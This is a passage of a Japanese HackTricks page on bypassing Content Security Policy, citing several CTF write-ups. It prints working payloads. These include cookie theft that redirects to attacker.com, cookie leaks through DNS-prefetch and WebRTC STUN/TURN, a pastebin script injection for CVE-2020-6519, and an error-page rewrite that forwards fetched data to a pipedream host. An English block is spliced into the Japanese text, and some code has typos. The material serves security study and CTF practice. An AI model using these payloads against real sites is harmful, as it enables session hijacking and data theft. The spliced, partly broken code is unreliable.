[**このCTF解説**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution)では、許可されたiframe内により制限の厳しいCSPを注入することでCSPをバイパスし、特定のJSファイルの読み込みを禁止し、その後、**プロトタイプ汚染**または**DOMクロブリング**を介して、異なるスクリプトを悪用して**任意のスクリプトを読み込む**ことができました。

IframeのCSPを**`csp`**属性で**制限**することができます：

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

[**このCTFの解説**](https://github.com/aszx87410/ctf-writeups/issues/48) では、**HTMLインジェクション**を通じて、**CSP**をより**制限**することが可能であり、CSTIを防ぐスクリプトが無効化され、その結果、**脆弱性が悪用可能になりました。**\
CSPは**HTMLメタタグ**を使用してより制限的にすることができ、インラインスクリプトは**エントリを削除**することで**無効化**され、そのために**nonce**を許可し、**sha**を使用して特定のインラインスクリプトを有効にできます。
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Content-Security-Policy-Report-Onlyを使用したJSデータの外部流出

サーバーがヘッダー**`Content-Security-Policy-Report-Only`**を**あなたが制御する値**で応答するようにできれば（たとえばCRLFのため）、それをあなたのサーバーを指すようにさせることができます。そして、外部流出したい**JSコンテンツ**を**`<script>`**で**ラップ**し、CSPで`unsafe-inline`が許可されていない可能性が非常に高いため、これによりCSPエラーが発生し、機密情報を含むスクリプトの一部が`Content-Security-Policy-Report-Only`からサーバーに送信されます。

例として、[**このCTF解説**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)を参照してください。

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### CSPとIframeを使用した情報漏洩

* `iframe`が作成され、CSPに許可されているURL（ここでは`https://example.redirect.com`と呼びます）を指すようにします。
* このURLは、CSPに許可されていない秘密のURL（例：`https://usersecret.example2.com`）にリダイレクトします。
* `securitypolicyviolation` イベントを監視することで、`blockedURI` プロパティをキャプチャできます。このプロパティは、ブロックされたURIのドメインを明らかにし、初期のURLがリダイレクトされた秘密のドメインを漏洩させます。

興味深いのは、ChromeやFirefoxなどのブラウザが、CSPに関連してiframeを処理する際に異なる挙動を示すことであり、未定義の挙動により機密情報が漏洩する可能性がある点です。

別の技術は、CSP自体を悪用して秘密のサブドメインを推測することです。この方法は、二分探索アルゴリズムに依存し、CSPを調整して特定のドメインを含め、意図的にブロックすることによって秘密のサブドメインを推測します。たとえば、秘密のサブドメインが不明な文字で構成されている場合、CSPディレクティブを変更してこれらのサブドメインをブロックまたは許可するように調整し、異なるサブドメインを反復的にテストできます。以下は、この方法を容易にするためにCSPを設定する方法を示すスニペットです：
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
CSP によってブロックまたは許可されるリクエストを監視することで、秘密のサブドメイン内の可能な文字を絞り込み、最終的に完全な URL を明らかにすることができます。

両方の方法は、ブラウザでの CSP の実装と動作の微妙な点を悪用し、見かけ上安全なポリシーが機密情報を意図せずに漏洩させる方法を示しています。

[**こちら**](https://ctftime.org/writeup/29310)からトリックを学びます。

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために、[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加してください！

**ハッキングの洞察**\
ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界の速報を追いかける

**最新の発表**\
最新のバグバウンティの開始や重要なプラットフォームの更新に関する情報を入手

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)** で私たちに参加し、今日からトップハッカーと協力を始めましょう！

## CSP をバイパスするための安全でないテクノロジー

### PHP レスポンスバッファの過負荷

PHP はデフォルトでレスポンスを 4096 バイトまでバッファリングすることで知られています。そのため、PHP が警告を表示している場合、**警告内に十分なデータを提供することで**、**レスポンス**が**CSP ヘッダー**の**前に送信**され、ヘッダーが無視されるようになります。\
その後、このテクニックは基本的に、**警告でレスポンスバッファを埋める**ことで、CSP ヘッダーが送信されないようにするというものです。

[**この解説**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)からのアイデアです。

### エラーページの書き換え

[**この解説**](https://blog.ssrf.kr/69) から見ると、エラーページ（おそらく CSP なしで）を読み込んでそのコンテンツを書き換えることで、CSP 保護をバイパスすることが可能だったようです。
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOMEは、**ページのエンドポイント**でのXSS（または非常に制限されたXSS）を悪用して、**同じオリジンの他のエンドポイントを悪用**する技術です。これは、攻撃者のページから脆弱なエンドポイントを読み込み、その後攻撃者のページをリフレッシュして、悪用したい同じオリジンの実際のエンドポイントに到達することで行われます。この方法により、**脆弱なエンドポイント**は**`opener`**オブジェクトを**ペイロード**で使用して、**悪用したい実際のエンドポイントのDOMにアクセス**できます。詳細については、次を参照してください：

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

さらに、**WordPress**には、`/wp-json/wp/v2/users/1?_jsonp=data`に**JSONP**エンドポイントがあり、出力に送信された**データ**を**反映**します（文字、数字、ドットのみの制限付き）。

攻撃者は、このエンドポイントを悪用してWordPressに対する**SOME攻撃**を行い、`<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`内に埋め込むことができます。この**スクリプト**は**'self'**によって**許可されている**ため、**読み込まれます**。さらに、WordPressがインストールされているため、攻撃者は、**CSPをバイパス**してユーザーにより多くの権限を与えたり、新しいプラグインをインストールしたりするために、**脆弱な** **コールバック**エンドポイントを介して**SOME攻撃**を悪用する可能性があります。\
この攻撃を実行する方法の詳細については、[https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)を参照してください。

## CSP Exfiltration Bypasses

外部サーバーとの**やり取りを許可しない厳格なCSP**がある場合、情報を外部に漏洩させるために常にできることがいくつかあります。

### Location

単に**ロケーションを更新**して、秘密情報を攻撃者のサーバーに送信することができます：
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### メタタグ

メタタグを注入することでリダイレクトすることができます（これは単なるリダイレクトであり、コンテンツは漏洩しません）
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

ページを高速に読み込むために、ブラウザはホスト名をIPアドレスに事前解決し、後で使用するためにキャッシュします。\
ブラウザにホスト名を事前解決するよう指示することができます: `<link reol="dns-prefetch" href="something.com">`

この動作を悪用して、DNSリクエストを介して機密情報を**外部流出**することができます。
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
## Content Security Policy (CSP) Bypass

### Bypassing CSP using `unsafe-inline`

One common way to bypass CSP is by using the `unsafe-inline` keyword in the `script-src` directive. This allows the execution of inline scripts, which are otherwise blocked by CSP.

To bypass CSP using `unsafe-inline`, you can inject your malicious script directly into the HTML code of the webpage. For example:

```html
<script>alert('CSP bypassed!')</script>
```

By including the script directly in the HTML, it will be executed despite the CSP restrictions.

### Bypassing CSP using data: URIs

Another method to bypass CSP is by using data: URIs. This technique involves converting the malicious script into a data URI format and embedding it directly into the webpage.

For example, the following data URI represents a simple JavaScript alert:

```html
<script src="data:text/javascript;base64,YWxlcnQoJ0NTUCBieXBvc2VkISInKTs="></script>
```

When this script is loaded, it will execute the alert message, bypassing the CSP restrictions.

### Conclusion

Bypassing CSP can be achieved through various techniques, such as using `unsafe-inline` or data: URIs. It is important for security professionals to understand these bypass methods in order to effectively test the security of web applications.
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
この問題を回避するために、サーバーは次のHTTPヘッダーを送信できます:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
明らかに、このテクニックはヘッドレスブラウザ（ボット）では機能しません。
{% endhint %}

### WebRTC

いくつかのページで、**WebRTCはCSPの`connect-src`ポリシーをチェックしない**と読むことができます。

実際に、_DNSリクエスト_を使用して情報を_漏洩_させることができます。このコードをチェックしてください：
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
もう1つのオプション:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## CSPポリシーのオンラインチェック

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## CSPの自動生成

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## 参考文献

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！

**ハッキングの洞察**\
ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加しましょう

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界を最新の状態で把握しましょう

**最新のアナウンスメント**\
最新のバグバウンティの開始や重要なプラットフォームの更新情報を把握しましょう

[**Discord**](https://discord.com/invite/N3FrSbmwdy) に参加して、今日からトップハッカーと協力を始めましょう！

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローする**
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
